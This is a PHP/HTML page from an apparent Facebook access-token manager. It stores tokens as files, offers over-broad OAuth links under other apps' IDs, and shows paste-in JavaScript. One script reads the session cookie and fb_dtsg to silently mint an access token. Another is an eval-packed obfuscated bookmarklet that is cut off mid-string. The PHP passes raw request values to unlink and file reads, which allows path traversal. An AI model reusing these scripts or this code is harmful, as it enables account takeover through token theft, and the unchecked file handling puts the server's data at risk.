<?php  
if (isset($_GET['logout'])) {
	unset($_SESSION['token_facebook_name']);	
	unset($_SESSION['token_facebook']);	
	unset($_SESSION['facebook_name']);	
	unset($_SESSION['facebook_image']);	
	header("location: ./");
}
if (isset($_GET['remove'])) {
	unlink('files/token/'.$_GET['filename']);
	unset($_SESSION['token_facebook_name']);	
	unset($_SESSION['token_facebook']);	
	unset($_SESSION['facebook_name']);	
	unset($_SESSION['facebook_image']);	
	header("location: ./");
}
?>
<?php if (@$_POST['savetoken']): ?>
	<?php  
	$tokenvalue = $_POST['tokenvalue'];
	$tokenname = $_POST['tokenname'];
	file_put_contents('files/token/'.$tokenname.".txt", $tokenvalue);
	$_SESSION['success'] = $lang['SAVE_SET'];
	header("location: ./");
	?>
<?php elseif (@$_POST['loadtoken']): ?>
	<?php  
	$filename = $_POST['token'];	
	$data = file_get_contents("files/token/".$filename);

	$_SESSION['success'] = $lang['LOAD_SET'];
	$_SESSION['token_facebook_name'] =  $filename;
	$_SESSION['token_facebook'] = $data;

	$get_data = file_get_contents_curl("https://graph.facebook.com/me?fields=picture,name&access_token={$data}");
	$get_data_result = json_decode($get_data);

	$_SESSION['facebook_name'] = $get_data_result->name;
	if (empty($get_data_result->picture->data->url)) {
		$image_url = $get_data_result->picture;
		$_SESSION['facebook_image'] = $image_url;
	}else {		
		$image_url = $get_data_result->picture->data->url;
		$_SESSION['facebook_image'] = $image_url;
	}

	if (!empty($_SESSION['facebook_name']) && !empty($_SESSION['facebook_image'])) {
		header("location: ./");
	}

	?>
<?php else: ?>
	<div class="row">
		<?php if (!empty($_SESSION['token_facebook'])): ?>
			<div class="col-md-12">
				<h3><?= $lang['LOAD_TOKEN'] ?></h3>
			</div>
			<form method="POST">
				<div class="col-md-6">
					<div class="form-group">					
						<select class='form-control selectpicker' name="token" data-live-search="true">
							<?php  
							$dir = "files/token/";
							if (!file_exists($dir)) {
								echo "<option value=''>Folder Tidak Ditemukan</option>";
							}
							if (is_dir($dir)){
								if ($dh = opendir($dir)){
									while (($file = readdir($dh)) !== false){
										if ($file == '..' or $file == '.') {
										}else {
											if ($file == $_SESSION['token_facebook_name']) {
												echo "<option value='$file' selected>$file</option>";
											}else {
												echo "<option value='$file'>$file</option>";
											}
										}
									}
									closedir($dh);
								}
							}
							?>
						</select>
					</div>															
				</div>
				<div class="form-group">
					<div class="col-md-2">						
						<input value="Load" class="btn btn-success gradient form-control" type="submit" name="loadtoken">
					</div>
					<div class="col-md-2">						
						<a href="?logout" class="btn btn-warning gradient form-control"><i class='fa fa-trash'></i> Remove</a>
					</div>
					<div class="col-md-2">					
						<a href="?remove=true&filename=<?= $_SESSION['token_facebook_name'] ?>" class="btn btn-danger gradient form-control"><i class='fa fa-trash'></i> Delete</a>
					</div>
				</div>
			</form>
		<?php else: ?>
			<div class="col-md-12">
				<h3><?= $lang['LOAD_TOKEN'] ?></h3>
			</div>
			<form method="POST">
				<div class="col-md-10">
					<div class="form-group">						
						<select class='form-control selectpicker' name="token" data-live-search="true">
							<?php  
							$dir = "files/token/";
							if (!file_exists($dir)) {
								echo "<option value=''>Folder Tidak Ditemukan</option>";
							}
							if (is_dir($dir)){
								if ($dh = opendir($dir)){
									while (($file = readdir($dh)) !== false){
										if ($file == '..' or $file == '.') {
										}else {
											echo "<option value='$file'>$file</option>";
										}
									}
									closedir($dh);
								}
							}
							?>
						</select>
					</div>															
				</div>
				<div class="col-md-2">
					<div class="form-group">
						<input value="Load" class="btn btn-success gradient form-control" type="submit" name="loadtoken">
					</div>
				</div>
			</form>
		<?php endif ?>

		<div class="col-md-12">
			<h3><?= $lang['GET_TOKEN'] ?></h3>
		</div>

		<div class="col-xs-6 col-sm-4 col-md-3">
			<div class="main-box mb-blog">
				<a target="_blank" href="https://goo.gl/Ep33Jb">
					<!-- https://www.facebook.com/v2.8/dialog/oauth?redirect_uri=fbconnect://success&scope=email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=193278124048833 -->
					<i class="fa fa-key fa-5x "></i>
					<h5>HTC Sense</h5>
				</a>				
			</div>	
		</div>

		<div class="col-xs-6 col-sm-4 col-md-3">
			<div class="main-box mb-youtube">
				<a href='#tokenandroid' data-toggle="modal" data-target="#tokenandroid">
					<i class="fa fa-key fa-5x "></i>
					<h5>Android</h5>
				</a>
			</div>		
		</div>

		<div class="col-xs-6 col-sm-4 col-md-3">
			<div class="main-box mb-facebook">
				<a target="_blank" href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=https://www.facebook.com/connect/login_success.html&scope=email,publish_actions,publish_pages,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=145634995501895">
					<i class="fa fa-key fa-5x "></i>
					<h5>Graph Explorer</h5>
				</a>
			</div>		
		</div>

		<div class="col-xs-6 col-sm-4 col-md-3">
			<div class="main-box mb-instagram">
				<a target="_blank" href="https://www.facebook.com/dialog/oauth?redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&display=popup&scope=user_about_me%2Cuser_actions.news%2Cuser_friends%2Cuser_likes%2Cuser_photos%2Cuser_status%2Cuser_subscriptions%2Cfriends_about_me%2Cfriends_likes%2Cfriends_location%2Cfriends_notes%2Cfriends_status%2Cmanage_pages%2Cpublish_actions%2Cpublish_checkins%2Cpublish_stream%2Cread_stream%2Cshare_item%2Cstatus_update&response_type=token&sso_key=com&client_id=174829003346&_rdr">
					<i class="fa fa-key fa-5x "></i>
					<h5>Spotify</h5>
				</a>
			</div>		
		</div>

		<div class="col-xs-6 col-sm-4 col-md-6">
			<div class="main-box mb-twitter">
				<a href='#tokeniphone' data-toggle="modal" data-target="#tokeniphone">
					<i class="fa fa-key fa-5x "></i>
					<h5>Iphone</h5>
				</a>
			</div>		
		</div>

		<div class="col-xs-6 col-sm-4 col-md-6">
			<div class="main-box mb-twitter">
				<a href='#tokenios' data-toggle="modal" data-target="#tokenios">
					<i class="fa fa-key fa-5x "></i>
					<h5>IOS</h5>
				</a>
			</div>		
		</div>

		<div class="col-md-6">
			<h3><?= $lang['FOR_HTC_TOKEN'] ?></h3>
			<textarea style="min-width:100%;max-width:100%;" cols="25" rows="5" readonly="">var uid=document.cookie.match(/c_user=(\d+)/)[1],dtsg=document.getElementsByName("fb_dtsg")[0].value,http=new XMLHttpRequest,url="//"+location.host+"/v1.0/dialog/oauth/confirm",params="fb_dtsg="+dtsg+"&app_id=193278124048833&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=page&access_token=&from_post=1&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1&__user="+uid;http.open("POST",url,!0),http.setRequestHeader("Content-type","application/x-www-form-urlencoded"),http.onreadystatechange=function(){if(4==http.readyState&&200==http.status){var a=http.responseText.match(/access_token=(.*)(?=&expires_in)/);a=a?a[1]:"Failed to get Access token make sure you authorized the HTC sense app",window.location.replace("https://developers.facebook.com/tools/debug/accesstoken/?q="+a+"&expires_in=0")}},http.send(params);</textarea>	
		</div>

		<div class="col-md-6">
			<h3>Token Windows</h3>
			<textarea style="min-width:100%;max-width:100%;" cols="25" rows="5" readonly="">javascript:void(function(){eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1a a=["\\Q\\f\\k\\F\\b","\\w\\y\\q\\m\\c\\o\\t","\\t\\b\\c\\Y\\k\\b\\B\\b\\h\\c\\o\\1I\\K\\1o\\f\\B\\b","\\B\\f\\c\\s\\E","\\s\\g\\g\\M\\e\\b","\\t\\b\\c\\O\\e\\B\\b","\\C\\2D\\V\\s\\1A\\Y\\1p\\1s\\1E\\1I\\K\\1u\\C\\P\\R\\1s\\g\\1w\\f\\Y\\1y\\1u\\C\\Y\\1y\\1m\\H\\1y\\e\\1y\\1f\\H\\R\\1g\\K\\b\\1m\\i\\1y\\g\\1g\\g\\Q\\K\\1s\\1y\\W\\1f\\U\\L\\P\\z\\F\\y\\L\\O\\L\\1f\\1E\\H\\1k\\V\\1g\\1A\\K\\1z\\1g\\1g\\z\\1k\\C\\1y\\P\\1p\\1w\\1p\\R\\2x\\Z\\1E\\V\\2x\\1p\\Y\\i\\1p\\1g\\e\\1E\\c\\D\\O\\K\\1k\\F\\B\\V\\1s\\n\\1k\\1m\\1m\\y\\P\\1y\\1u\\Z\\z\\e\\C\\j\\1b\\1g\\1c\\C\\F\\C\\g\\C\\f\\f\\K\\i\\E\\2D\\g\\R\\g\\E\\z\\1E\\y\\L\\1I\\z\\i\\z\\1m\\i\\2x\\1E\\V\\R\\4W\\x\\1E\\1b\\1s\\1g\\V\\e\\V\\b\\b\\z\\B\\1g\\z\\1m\\f\\L\\Z\\Z\\E\\V\\C\\Y\\t\\P\\P\\z\\1y\\1m\\W\\1c\\R\\Z\\z\\U\\1y\\1k\\U\\n\\Y\\1r\\B\\R\\K\\f\\1p\\Y\\1u\\Y\\1c\\1b\\1g\\V\\f\\w\\z\\1k\\R\\K\\1s\\Q\\K\\1g\\k\\1s\\1E","\\W\\D\\R\\V\\W\\1g\\x","\\x\\D\\H\\x\\H\\H\\x\\R\\W\\U\\H\\W\\R\\x\\W\\U\\x","\\P\\B\\y\\e\\k\\l\\O\\g\\M\\b\\h\\l\\1f\\f\\s\\b\\y\\g\\g\\M\\l\\1D\\b\\i\\B\\f\\h\\b\\h","\\y\\g\\m\\K","\\m\\e\\Q","\\s\\i\\b\\f\\c\\b\\Y\\k\\b\\B\\b\\h\\c","\\e\\m","\\e\\h\\w\\g\\i\\B\\f\\o\\e","\\n\\f\\m\\m\\e\\h\\t","\\o\\c\\K\\k\\b","\\x\\D\\n\\z","\\y\\g\\i\\m\\b\\i\\1z\\f\\m\\e\\F\\o","\\L\\e\\m\\c\\E","\\V\\D\\D\\n\\z","\\n\\g\\o\\e\\c\\e\\g\\h","\\w\\e\\z\\b\\m","\\1p\\T\\h\\m\\b\\z","\\R\\R\\R\\R","\\c\\g\\n","\\1b\\2i","\\k\\b\\w\\c","\\C\\2i","\\w\\g\\h\\c\\1r\\e\\1p\\b","\\x\\H\\n\\z","\\w\\g\\h\\c\\1y\\b\\e\\t\\E\\c","\\U\\D\\D","\\y\\g\\z\\1r\\E\\f\\m\\g\\L","\\D\\l\\D\\l\\C\\n\\z\\l\\1q\\D\\D\\D","\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\1u\\g\\k\\g\\i","\\i\\t\\y\\f\\1L\\x\\V\\D\\1l\\l\\H\\H\\1b\\1l\\l\\x\\V\\1b\\1l\\l\\D\\N\\1g\\C\\1K","\\e\\h\\h\\b\\i\\1w\\O\\1t\\1i","\\J\\E\\H\\l\\o\\c\\K\\k\\b\\p\\u\\m\\e\\o\\n\\k\\f\\K\\r\\e\\h\\k\\e\\h\\b\\j\\y\\k\\g\\s\\M\\u\\I","\\J\\A\\E\\H\\I\\l\\J\\o\\n\\f\\h\\l\\o\\c\\K\\k\\b\\p\\u\\w\\k\\g\\f\\c\\r\\i\\e\\t\\E\\c\\G\\w\\g\\h\\c\\j\\o\\e\\1p\\b\\r\\x\\x\\n\\z\\u\\I\\Z\\b\\Q\\b\\k\\g\\n\\b\\m\\l\\y\\K\\l\\T\\t\\h\\e\\b\\k\\l\\j\\l\\J\\f\\l\\E\\i\\b\\w\\p\\u\\E\\c\\c\\n\\r\\A\\A\\L\\L\\L\\N\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\u\\l\\c\\f\\i\\t\\b\\c\\p\\u\\q\\y\\k\\f\\h\\M\\u\\l\\c\\e\\c\\k\\b\\p\\u\\T\\t\\h\\e\\b\\k\\u\\I\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\J\\A\\f\\I\\J\\A\\o\\n\\f\\h\\I\\J\\E\\i\\l\\o\\c\\K\\k\\b\\p\\u\\y\\g\\i\\m\\b\\i\\j\\c\\g\\n\\r\\x\\n\\z\\l\\o\\g\\k\\e\\m\\l\\1q\\V\\V\\V\\u\\A\\I","\\J\\m\\e\\Q\\l\\e\\m\\p\\u\\k\\g\\f\\m\\P\\L\\f\\k\\u\\I\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\i\\t\\y\\f\\1L\\H\\C\\C\\1l\\H\\C\\C\\1l\\H\\C\\C\\1l\\D\\N\\C\\1K\\G\\n\\f\\m\\m\\e\\h\\t\\r\\l\\V\\n\\z\\l\\1b\\n\\z\\G\\B\\f\\i\\t\\e\\h\\j\\y\\g\\c\\c\\g\\B\\r\\x\\D\\n\\z\\u\\I\\1u\\b\\M\\l\\k\\e\\o\\b\\h\\o\\e\\N\\N\\N\\J\\A\\m\\e\\Q\\I\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\c\\b\\z\\c\\j\\f\\k\\e\\t\\h\\r\\s\\b\\h\\c\\b\\i\\u\\I\\1f\\1z\\Y\\Y\\N\\l\\1o\\g\\c\\l\\w\\g\\i\\l\\o\\f\\k\\b\\l\\v\\s\\g\\n\\K\\G\\l\\T\\t\\h\\e\\b\\k\\l\\j\\l\\O\\g\\g\\k\\l\\t\\i\\f\\c\\e\\o\\l\\m\\f\\i\\e\\l\\J\\f\\l\\E\\i\\b\\w\\p\\u\\E\\c\\c\\n\\r\\A\\A\\L\\L\\L\\N\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\u\\l\\c\\f\\i\\t\\b\\c\\p\\u\\q\\y\\k\\f\\h\\M\\u\\l\\c\\e\\c\\k\\b\\p\\u\\T\\t\\h\\e\\b\\k\\u\\I\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\J\\A\\f\\I\\J\\A\\m\\e\\Q\\I\\J\\A\\m\\e\\Q\\I","\\f\\n\\n\\b\\h\\m\\1u\\E\\e\\k\\m","\\e\\t\\h\\e\\b\\k","\\1D\\1c\\1r\\O","\\f\\1A\\f\\z\\A\\w\\g\\k\\k\\g\\L\\A\\w\\g\\k\\k\\g\\L\\q\\n\\i\\g\\w\\e\\k\\b\\N\\n\\E\\n\\2c\\q\\q\\f\\p\\x\\v\\m\\n\\i\\p\\x\\v\\w\\y\\q\\m\\c\\o\\t\\p","\\v\\q\\q\\F\\o\\b\\i\\p","\\v\\q\\q\\m\\K\\h\\p","\\v\\c\\c\\o\\c\\f\\B\\n\\p","\\v\\q\\q\\i\\b\\Q\\p","\\v\\n\\i\\g\\w\\e\\k\\b\\q\\e\\m\\p\\x\\D\\D\\D\\D\\D\\1b\\H\\1g\\C\\W\\x\\V\\x\\1g\\v\\k\\g\\s\\f\\c\\e\\g\\h\\p\\x\\v\\h\\s\\c\\i\\1J\\q\\B\\g\\m\\1F\\p\\n\\f\\t\\b\\k\\b\\c\\q\\c\\e\\B\\b\\k\\e\\h\\b\\q\\n\\i\\g\\w\\e\\k\\b\\q\\f\\s\\c\\e\\g\\h\\o\\v\\l\\q\\q\\f\\w\\p\\e\\L\\v\\l\\q\\q\\i\\b\\1m\\p\\C\\v\\l\\q\\q\\y\\b\\p\\j\\x\\v\\l\\q\\q\\n\\s\\p\\1D\\1w\\P\\1r\\Y\\Z\\r\\Z\\Y\\1f\\P\\1s\\1i\\O","\\g\\n\\b\\h","\\1u\\g\\h\\c\\b\\h\\c\\j\\c\\K\\n\\b","\\f\\n\\n\\k\\e\\s\\f\\c\\e\\g\\h\\A\\z\\j\\L\\L\\L\\j\\w\\g\\i\\B\\j\\F\\i\\k\\b\\h\\s\\g\\m\\b\\m","\\o\\b\\c\\1z\\b\\1m\\F\\b\\o\\c\\1w\\b\\f\\m\\b\\i","\\o\\b\\h\\m","\\v\\n\\i\\g\\w\\e\\k\\b\\q\\e\\m\\p\\x\\C\\R\\U\\W\\U\\W\\D\\D\\R\\v\\k\\g\\s\\f\\c\\e\\g\\h\\p\\x\\v\\h\\s\\c\\i\\1J\\q\\B\\g\\m\\1F\\p\\n\\f\\t\\b\\k\\b\\c\\q\\c\\e\\B\\b\\k\\e\\h\\b\\q\\n\\i\\g\\w\\e\\k\\b\\q\\f\\s\\c\\e\\g\\h\\o\\v\\l\\q\\q\\f\\w\\p\\e\\L\\v\\l\\q\\q\\i\\b\\1m\\p\\C\\v\\l\\q\\q\\y\\b\\p\\j\\x\\v\\l\\q\\q\\n\\s\\p\\1D\\1w\\P\\1r\\Y\\Z\\r\\Z\\Y\\1f\\P\\1s\\1i\\O","\\A\\f\\1A\\f\\z\\A\\n\\f\\t\\b\\o\\A\\w\\f\\h\\q\\o\\c\\f\\c\\F\\o\\N\\n\\E\\n\\2c\\q\\q\\f\\p\\x\\v\\m\\n\\i\\p\\x\\v\\w\\y\\q\\m\\c\\o\\t\\p","\\v\\w\\y\\n\\f\\t\\b\\q\\e\\m\\p\\x\\D\\U\\U\\U\\D\\U\\x\\H\\1b\\D\\U\\x\\U\\V\\v\\f\\m\\m\\p\\c\\i\\F\\b\\v\\i\\b\\k\\g\\f\\m\\p\\w\\f\\k\\o\\b\\v\\w\\f\\h\\q\\g\\i\\e\\t\\e\\h\\p\\n\\f\\t\\b\\q\\c\\e\\B\\b\\k\\e\\h\\b\\v\\w\\f\\h\\q\\o\\g\\F\\i\\s\\b\\p\\v\\s\\f\\c\\p\\v\\f\\s\\c\\g\\i\\q\\e\\m\\p","\\v\\f\\Q\\p","\\v\\q\\q\\i\\b\\1m\\p\\C\\v\\l\\q\\q\\y\\b\\p\\j\\x\\v\\l\\q\\q\\n\\s\\p\\1D\\1w\\P\\1r\\Y\\Z\\r\\Z\\Y\\1f\\P\\1s\\1i\\O","\\v\\w\\y\\n\\f\\t\\b\\q\\e\\m\\p\\x\\H\\U\\C\\W\\1b\\R\\H\\W\\D\\x\\1g\\W\\V\\H\\V\\v\\f\\m\\m\\p\\c\\i\\F\\b\\v\\i\\b\\k\\g\\f\\m\\p\\w\\f\\k\\o\\b\\v\\w\\f\\h\\q\\g\\i\\e\\t\\e\\h\\p\\n\\f\\t\\b\\q\\c\\e\\B\\b\\k\\e\\h\\b\\v\\w\\f\\h\\q\\o\\g\\F\\i\\s\\b\\p\\v\\s\\f\\c\\p\\v\\f\\s\\c\\g\\i\\q\\e\\m\\p","\\v\\l\\q\\q\\i\\b\\1m\\p\\C\\v\\l\\q\\q\\y\\b\\p\\j\\x\\v\\l\\q\\q\\n\\s\\p\\1D\\1w\\P\\1r\\Y\\Z\\r\\Z\\Y\\1f\\P\\1s\\1i\\O","\\A\\F\\w\\e\\A\\i\\b\\f\\s\\c\\e\\g\\h\\A\\2c\\m\\n\\i\\p\\x\\v\\w\\y\\q\\m\\c\\o\\t\\p","\\v\\q\\q\\f\\p\\x\\v\\l\\q\\q\\f\\w\\p\\e\\L\\v\\l\\q\\q\\i\\b\\1m\\p\\m\\v\\l\\q\\q\\y\\b\\p\\j\\x\\v\\l\\q\\q\\n\\s\\p\\1D\\1w\\P\\1r\\Y\\Z\\r\\Z\\Y\\1f\\P\\1s\\1i\\O\\v\\s\\k\\e\\b\\h\\c\\q\\e\\m\\p","\\v\\s\\k\\e\\b\\h\\c\\q\\e\\m\\p","\\v\\w\\c\\q\\b\\h\\c\\q\\e\\m\\b\\h\\c\\e\\w\\e\\b\\i\\p\\x\\D\\H\\x\\H\\H\\x\\R\\W\\U\\H\\W\\R\\x\\W\\U\\x\\v\\i\\b\\f\\s\\c\\e\\g\\h\\q\\c\\K\\n\\b\\p\\x\\v\\i\\g\\g\\c\\q\\e\\m\\p\\F\\q\\D\\q\\W\\D\\v\\o\\g\\F\\i\\s\\b\\p\\H\\x\\v\\f\\Q\\p\\x\\C\\R\\U\\W\\U\\W\\D\\D\\R\\v\\w\\c\\1J\\c\\h\\1F\\p\\1F\\j\\1z\\j\\1z\\v\\w\\c\\1J\\c\\g\\n\\q\\k\\b\\Q\\b\\k\\q\\n\\g\\o\\c\\q\\e\\m\\1F\\p\\x\\D\\H\\x\\H\\H\\x\\R\\W\\U\\H\\W\\R\\x\\W\\U\\x\\v\\w\\c\\1J\\c\\k\\q\\g\\y\\1A\\e\\m\\1F\\p\\x\\D\\H\\x\\H\\H\\x\\R\\W\\U\\H\\W\\R\\x\\W\\U\\x\\v\\w\\c\\1J\\c\\E\\i\\g\\L\\y\\f\\s\\M\\q\\o\\c\\g\\i\\K\\q\\w\\y\\e\\m\\1F\\p\\x\\D\\H\\x\\H\\H\\x\\R\\W\\U\\H\\W\\R\\x\\W\\U\\x\\v\\w\\c\\1J\\w\\y\\w\\b\\b\\m\\q\\k\\g\\s\\f\\c\\e\\g\\h\\1F\\p\\x\\D\\v\\h\\s\\c\\i\\1J\\q\\B\\g\\m\\1F\\p\\n\\f\\t\\b\\k\\b\\c\\q\\c\\e\\B\\b\\k\\e\\h\\b\\q\\i\\b\\s\\b\\h\\c","\\A\\n\\k\\F\\t\\e\\h\\o\\A\\n\\g\\o\\c\\A\\g\\b\\B\\y\\b\\m\\N\\1A\\o\\g\\h\\A\\2c\\F\\i\\k\\p\\E\\c\\c\\n\\o\\r\\A\\A\\L\\L\\L\\N\\w\\f\\s\\b\\y\\g\\g\\M\\N\\s\\g\\B\\A\\x\\C\\R\\U\\W\\U\\W\\D\\D\\R\\A\\n\\g\\o\\c\\o\\A","\\1E\\Y\\O","\\g\\h\\i\\b\\f\\m\\K\\o\\c\\f\\c\\b\\s\\E\\f\\h\\t\\b","\\m\\e\\o\\n\\k\\f\\K","\\k\\g\\f\\m\\P\\L\\f\\k","\\t\\b\\c\\Y\\k\\b\\B\\b\\h\\c\\1I\\K\\T\\m","\\h\\g\\h\\b","\\i\\b\\f\\m\\K\\1r\\c\\f\\c\\b","\\o\\c\\f\\c\\F\\o","\\i\\b\\o\\n\\g\\h\\o\\b\\O\\b\\z\\c","\\n\\f\\i\\o\\b","\\E\\c\\B\\k","\\w\\y\\j\\z\\w\\y\\B\\k\\j\\n\\f\\i\\o\\b\\j\\e\\t\\h\\g\\i\\b\\4G\\I\\J\\n\\I","\\e\\h\\m\\b\\z\\1c\\w","\\J\\A\\n\\I","\\k\\f\\o\\c\\T\\h\\m\\b\\z\\1c\\w","\\o\\F\\y\\o\\c\\i\\e\\h\\t","","\\2u\\2u\\2u","\\P\\1k\\O\\T\\1f","\\P\\M\\c\\e\\w","\\f\\M\\c\\e\\w","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\B\\f\\i\\t\\e\\h\\j\\c\\g\\n\\r\\x\\D\\n\\z\\G\\c\\b\\z\\c\\j\\f\\k\\e\\t\\h\\r\\s\\b\\h\\c\\b\\i\\G\\c\\i\\f\\h\\o\\e\\c\\e\\g\\h\\r\\f\\k\\k\\l\\D\\N\\C\\o\\l\\b\\f\\o\\b\\u\\l\\e\\m\\p\\u\\m\\e\\Q\\o\\f\\c\\F\\u\\I\\J\\A\\m\\e\\Q\\I","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\B\\f\\i\\t\\e\\h\\j\\c\\g\\n\\r\\x\\D\\n\\z\\u\\l\\e\\m\\p\\u\\k\\f\\n\\g\\i\\f\\h\\u\\I\\J\\A\\m\\e\\Q\\I","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\m\\e\\o\\n\\k\\f\\K\\r\\e\\h\\k\\e\\h\\b\\j\\y\\k\\g\\s\\M\\G\\L\\e\\m\\c\\E\\r\\x\\D\\D\\2i\\u\\I\\J\\y\\F\\c\\c\\g\\h\\l\\o\\c\\K\\k\\b\\p\\u\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\1q\\1f\\U\\1f\\1b\\1f\\R\\G\\s\\g\\k\\g\\i\\r\\1q\\V\\1I\\V\\1f\\C\\U\\G\\n\\f\\m\\m\\e\\h\\t\\r\\H\\n\\z\\l\\U\\n\\z\\G\\y\\g\\i\\m\\b\\i\\r\\l\\x\\n\\z\\l\\o\\g\\k\\e\\m\\l\\1q\\s\\b\\m\\D\\m\\V\\G\\s\\F\\i\\o\\g\\i\\r\\n\\g\\e\\h\\c\\b\\i\\G\\m\\e\\o\\n\\k\\f\\K\\r\\e\\h\\k\\e\\h\\b\\j\\y\\k\\g\\s\\M\\G\\w\\g\\h\\c\\j\\o\\e\\1p\\b\\r\\x\\H\\n\\z\\G\\y\\g\\i\\m\\b\\i\\j\\i\\f\\m\\e\\F\\o\\r\\H\\n\\z\\G\\j\\L\\b\\y\\M\\e\\c\\j\\w\\g\\h\\c\\j\\o\\B\\g\\g\\c\\E\\e\\h\\t\\r\\f\\h\\c\\e\\f\\k\\e\\f\\o\\b\\m\\G\\w\\g\\h\\c\\j\\L\\b\\e\\t\\E\\c\\r\\y\\g\\k\\m\\G\\k\\e\\h\\b\\j\\E\\b\\e\\t\\E\\c\\r\\x\\1g\\n\\z\\G\\c\\b\\z\\c\\j\\f\\k\\e\\t\\h\\r\\s\\b\\h\\c\\b\\i\\G\\c\\b\\z\\c\\j\\m\\b\\s\\g\\i\\f\\c\\e\\g\\h\\r\\h\\g\\h\\b\\G\\c\\b\\z\\c\\j\\o\\E\\f\\m\\g\\L\\r\\h\\g\\h\\b\\G\\Q\\b\\i\\c\\e\\s\\f\\k\\j\\f\\k\\e\\t\\h\\r\\c\\g\\n\\G\\L\\E\\e\\c\\b\\j\\o\\n\\f\\s\\b\\r\\h\\g\\L\\i\\f\\n\\u\\l\\g\\h\\s\\k\\e\\s\\M\\p\\u\\e\\t\\h\\e\\b\\k\\N\\c\\F\\c\\F\\n\\1L\\1K\\u\\I\\1u\\k\\g\\o\\b\\J\\A\\y\\F\\c\\c\\g\\h\\I\\l\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\w\\k\\g\\f\\c\\r\\i\\e\\t\\E\\c\\u\\I\\l\\J\\y\\F\\c\\c\\g\\h\\l\\g\\h\\s\\k\\e\\s\\M\\p\\u\\e\\t\\h\\e\\b\\k\\N\\f\\k\\n\\E\\f\\y\\b\\c\\b\\b\\o\\1L\\1K\\u\\l\\e\\m\\p\\u\\o\\c\\f\\i\\c\\u\\l\\o\\c\\K\\k\\b\\p\\u\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\1q\\V\\H\\U\\1b\\1I\\H\\G\\s\\g\\k\\g\\i\\r\\1q\\w\\w\\w\\G\\n\\f\\m\\m\\e\\h\\t\\r\\C\\n\\z\\l\\C\\D\\n\\z\\G\\B\\f\\i\\t\\e\\h\\j\\k\\b\\w\\c\\r\\D\\n\\z\\G\\y\\g\\i\\m\\b\\i\\r\\x\\n\\z\\l\\o\\g\\k\\e\\m\\l\\1q\\s\\b\\m\\D\\m\\V\\G\\s\\F\\i\\o\\g\\i\\r\\n\\g\\e\\h\\c\\b\\i\\G\\m\\e\\o\\n\\k\\f\\K\\r\\e\\h\\k\\e\\h\\b\\j\\y\\k\\g\\s\\M\\G\\w\\g\\h\\c\\j\\o\\e\\1p\\b\\r\\x\\H\\n\\z\\G\\y\\g\\i\\m\\b\\i\\j\\i\\f\\m\\e\\F\\o\\r\\H\\n\\z\\G\\j\\L\\b\\y\\M\\e\\c\\j\\w\\g\\h\\c\\j\\o\\B\\g\\g\\c\\E\\e\\h\\t\\r\\f\\h\\c\\e\\f\\k\\e\\f\\o\\b\\m\\G\\w\\g\\h\\c\\j\\L\\b\\e\\t\\E\\c\\r\\y\\g\\k\\m\\G\\k\\e\\h\\b\\j\\E\\b\\e\\t\\E\\c\\r\\x\\1g\\n\\z\\G\\c\\b\\z\\c\\j\\f\\k\\e\\t\\h\\r\\s\\b\\h\\c\\b\\i\\G\\c\\b\\z\\c\\j\\m\\b\\s\\g\\i\\f\\c\\e\\g\\h\\r\\h\\g\\h\\b\\G\\c\\b\\z\\c\\j\\o\\E\\f\\m\\g\\L\\